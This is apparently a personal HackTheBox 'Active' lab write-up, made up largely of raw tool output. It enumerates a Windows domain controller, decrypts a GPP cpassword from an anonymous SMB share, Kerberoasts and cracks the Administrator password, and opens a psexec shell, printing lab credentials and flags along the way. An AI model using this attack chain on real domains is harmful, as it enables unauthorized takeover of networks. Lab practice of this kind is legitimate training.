Active IP;10.10.10.100



rustscan:
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5722/tcp  open  msdfsr           syn-ack
9389/tcp  open  adws             syn-ack
49152/tcp open  unknown          syn-ack
49153/tcp open  unknown          syn-ack
49154/tcp open  unknown          syn-ack
49155/tcp open  unknown          syn-ack
49157/tcp open  unknown          syn-ack
49158/tcp open  unknown          syn-ack
49165/tcp open  unknown          syn-ack
49168/tcp open  unknown          syn-ack
49174/tcp open  unknown          syn-ack




nmap:


PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  tcpwrapped    syn-ack
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  tcpwrapped    syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5722/tcp  open  msrpc         syn-ack Microsoft Windows RPC
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49152/tcp open  msrpc         syn-ack Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack Microsoft Windows RPC
49165/tcp open  msrpc         syn-ack Microsoft Windows RPC
49168/tcp open  msrpc         syn-ack Microsoft Windows RPC
49174/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 17m57s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 38577/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 40109/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 51069/udp): CLEAN (Timeout)
|   Check 4 (port 38631/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-02-10T14:23:36
|_  start_date: 2023-02-10T14:17:17




enum4linux:

enum4linux -v 10.10.10.100
[V] Dependent program "nmblookup" found in /usr/bin/nmblookup
[V] Dependent program "net" found in /usr/bin/net
[V] Dependent program "rpcclient" found in /usr/bin/rpcclient
[V] Dependent program "smbclient" found in /usr/bin/smbclient
[V] Dependent program "polenum" found in /usr/bin/polenum
[V] Dependent program "ldapsearch" found in /usr/bin/ldapsearch
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Apr 14 04:11:07 2023

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.100
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.100    |
 ==================================================== 
[V] Attempting to get domain name with command: nmblookup -A '10.10.10.100'
[E] Can't find workgroup/domain


 ============================================ 
|    Nbtstat Information for 10.10.10.100    |
 ============================================ 
Looking up status of 10.10.10.100
No reply from 10.10.10.100

 ===================================== 
|    Session Check on 10.10.10.100    |
 ===================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[V] Attempting to make null session using command: smbclient -W '' //'10.10.10.100'/ipc$ -U''%'' -c 'help' 2>&1
[+] Server 10.10.10.100 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 =========================================== 
|    Getting domain SID for 10.10.10.100    |
 =========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
[V] Attempting to get domain SID with command: rpcclient -W '' -U''%'' 10.10.10.100 -c 'lsaquery' 2>&1
do_cmd: Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================== 
|    OS information on 10.10.10.100    |
 ====================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
[V] Attempting to get OS info with command: smbclient -W '' //'10.10.10.100'/ipc$ -U''%'' -c 'q' 2>&1
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.10.100 from smbclient: 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[V] Attempting to get OS info with command: rpcclient -W '' -U''%'' -c 'srvinfo' '10.10.10.100' 2>&1
[+] Got OS info for 10.10.10.100 from srvinfo:
        10.10.10.100   Wk Sv PDC Tim NT     Domain Controller
        platform_id     :       500
        os version      :       6.1
        server type     :       0x80102b

 ============================= 
|    Users on 10.10.10.100    |
 ============================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[V] Attempting to get userlist with command: rpcclient -W '' -c querydispinfo -U''%'' '10.10.10.100' 2>&1
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[V] Attempting to get userlist with command: rpcclient -W '' -c enumdomusers -U''%'' '10.10.10.100' 2>&1
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ========================================= 
|    Share Enumeration on 10.10.10.100    |
 ========================================= 
[V] Attempting to get share list using authentication
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
do_connect: Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.10.100
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
[V] Attempting map to share //10.10.10.100/ADMIN$ with command: smbclient -W '' //'10.10.10.100'/'ADMIN$' -U''%'' -c dir 2>&1
//10.10.10.100/ADMIN$   Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
[V] Attempting map to share //10.10.10.100/C$ with command: smbclient -W '' //'10.10.10.100'/'C$' -U''%'' -c dir 2>&1
//10.10.10.100/C$       Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
[V] Attempting map to share //10.10.10.100/IPC$ with command: smbclient -W '' //'10.10.10.100'/'IPC$' -U''%'' -c dir 2>&1
//10.10.10.100/IPC$     Mapping: OK     Listing: DENIED
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
[V] Attempting map to share //10.10.10.100/NETLOGON with command: smbclient -W '' //'10.10.10.100'/'NETLOGON' -U''%'' -c dir 2>&1
//10.10.10.100/NETLOGON Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
[V] Attempting map to share //10.10.10.100/Replication with command: smbclient -W '' //'10.10.10.100'/'Replication' -U''%'' -c dir 2>&1
//10.10.10.100/Replication      Mapping: OK, Listing: OK
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
[V] Attempting map to share //10.10.10.100/SYSVOL with command: smbclient -W '' //'10.10.10.100'/'SYSVOL' -U''%'' -c dir 2>&1
//10.10.10.100/SYSVOL   Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
[V] Attempting map to share //10.10.10.100/Users with command: smbclient -W '' //'10.10.10.100'/'Users' -U''%'' -c dir 2>&1
//10.10.10.100/Users    Mapping: DENIED, Listing: N/A

 ==================================================== 
|    Password Policy Information for 10.10.10.100    |
 ==================================================== 
[V] Attempting to get Password Policy info with command: polenum '':''@'10.10.10.100' 2>&1
[E] Unexpected error from polenum:


[+] Attaching to 10.10.10.100 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.10.100)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.
[V] Attempting to get Password Policy info with command: rpcclient -W '' -U''%'' '10.10.10.100' -c "getdompwinfo" 2>&1

[E] Failed to get password policy with rpcclient


 ============================== 
|    Groups on 10.10.10.100    |
 ============================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
[V] Getting builtin groups with command: rpcclient -W '' -U''%'' '10.10.10.100' -c 'enumalsgroups builtin' 2>&1

[+] Getting builtin groups:

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
[V] Getting local groups with command: rpcclient -W '' -U''%'' '10.10.10.100' -c 'enumalsgroups domain' 2>&1

[+] Getting local groups:

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.
[V] Getting domain groups with command: rpcclient -W '' -U''%'' '10.10.10.100' -c "enumdomgroups" 2>&1

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================= 
|    Users on 10.10.10.100 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
[V] Attempting to get SID from 10.10.10.100 with command: rpcclient -W '' -U''%'' '10.10.10.100' -c 'lookupnames administrator' 2>&1
[V] Assuming that user "administrator" exists
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.
[V] Attempting to get SIDs from 10.10.10.100 with command: rpcclient -W '' -U''%'' '10.10.10.100' -c lsaenumsid 2>&1

 ============================================= 
|    Getting printer info for 10.10.10.100    |
 ============================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.
[V] Attempting to get printer info with command: rpcclient -W '' -U''%'' -c 'enumprinters' '10.10.10.100' 2>&1
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED





smbmap -H 10.10.10.100                                    
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
                                                                          


if we log in to smbclient:

smbclient  //10.10.10.100/Replication                                                                                                                                                        1 ⨯
Password for [WORKGROUP\kali]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  active.htb                          D        0  Sat Jul 21 06:37:44 2018


there is a folder called active.htb. Navigating the folder to Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups we find a groups.xml file:

└─$ cat Groups.xml  
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>


we have a username and a hash

we decrypt the hash

┌──(kali㉿kali)-[~/Practice/HackTheBox/Active]
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ                                         
GPPstillStandingStrong2k18



we can use the credentials gained above to get the admin token:


┌──(kali㉿kali)-[~/…/Lab1/MS17-010_CVE-2017-0143/venv/bin]
└─$ ./GetUserSPNs.py -request -dc-ip 10.10.10.100 "active.htb/SVC_TGS:GPPstillStandingStrong2k18"
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-02-10 09:18:15.314535             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$0bc6472e8e24ad424500f723bb60ed20$12fd0f240bb31ddba89ea1baefb415588d96f23f5a83a1e850fd077f91d84a60e128d676f5ec8414059a24ef981827ac635215b3a7b28474a0212641436517adb9bbd3b48c982d090d6fd264f62f44c95c5d1ac999a6900f5bd388e1e0da7781844f113b2a4fa4aa523f14ccc206f95142f06c183864b7e32d0b175fc0f5ca0d40af895d9f2d8fee23525a5a27bb71a8fbf7ee863062e7cf90a676544310937b8f9769ad65a88ba8a1999d902b3e13ab374550eae0b3e1de1397b5161360e4b75489d920be87efc619787165fe605d8fece33b029100e71b7afa0298dbb454f63714940dbd6baae39304b0b81a0bcfdb6d4d8ccc2c7263078eba7e477c5cc7e48852a84038ec8838037189ec1af45e6364fe7e3dde9f9327c693729fda6f76f817b332c84500d270b896bf48352d47dd8c22f222cc036263a404fac9fdbb01a310a8f05be787589d5c97ed2b3748310114889a1bde585b08401d2d722fea6b52ae92dcc0740fee43634aad9362320c5130ceab81ba21428db569d4bf7054f5f7040337f2c39f535a5198836a4ba1dab673a32f3e0f3dceda7eafa64ef7285e70ebba8550d7de8589d9d50b255ac35f196951ee0e97d1289c96be128c5559adc3df9e2725e0adb14d61a4568284d1226c5e168c20e8188627dbb0a2ea5bdad3a213d1fb059300d4ff9c839476763c698c760c78a17ef6c418fe49f097f4a8cc420b4308c3c3a038e7d4d5f487e7f88b27e255286cfc5abb8be5c3bcbb52050aef0d05dee779d13e8168bbaa6e5c1bfa06e9a0b472fe0eb8d13056c1b4d4830fe516e3e0233aca20731f03f27f6187d5492c8bd27da4f7baa547abaed9e13333ded1b4decb097ec97d33cf3bd8032def5234fe0d452648226cd9328d1fa7bfb7d1121b3394a7ae95a6ceefa53295f2458a07a6d097180cc81e34cb20fa8d6d960f1d12a93aa8494b45970bb1687ac3f2253bcfd89b846136e37f292c65aea003a615896edc8e964142116f2528127a44d8f95f9f46fd86f2a9be9e1ab015345975c12d5ad7212dc808b0118b989efa5b968e7438d483ffe99775c288d9031bf8f05876a2b0806748b5322103cc739cf2ecbef3c3c1bcd666d2a61c4f895b527746844410ff7ef25da2697e4c266b5abcf4b9bd0c9fca0cbbde8802e625e4aed759548959863bc76012ca55b3e9f2215f3460d5b30ef41972eb209883362a03c996d226058dae9cde0f1abef682d803e5d48f8e75ecfebc46a2b506


now we use john to crack it:


(kali㉿kali)-[~/Practice/HackTheBox/Active]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt admin.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:03 DONE (2023-02-10 10:52) 0.2512g/s 2647Kp/s 2647Kc/s 2647KC/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


With the admin credentials, we use psexec.py to log in:

┌──(kali㉿kali)-[~/…/Lab1/MS17-010_CVE-2017-0143/venv/bin]
└─$ ./psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100                                                                                                                           1 ⨯
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file QXlKCzTZ.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service AnIM on 10.10.10.100.....
[*] Starting service AnIM.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> cd C:\Users









C:\Users\SVC_TGS>
dir
C:\Users\SVC_TGS\Desktop> Volume in drive C has no label.
 Volume Serial Number is 15BB-D59C

 Directory of C:\Users\SVC_TGS\Desktop

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
21/07/2018  05:14 ��    <DIR>          .

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
21/07/2018  05:14 ��    <DIR>          ..

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
10/02/2023  04:18 ��                34 user.txt

               1 File(s)             34 bytes
               2 Dir(s)   1.144.197.120 bytes free

type user.txt
C:\Users\SVC_TGS\Desktop>4ab7b326307f2ddda22ccaebb2d6b7fc



C:\Users\Administrator\Desktop> type root.txt
0415b1cabae5671ffb246adde556e9ef

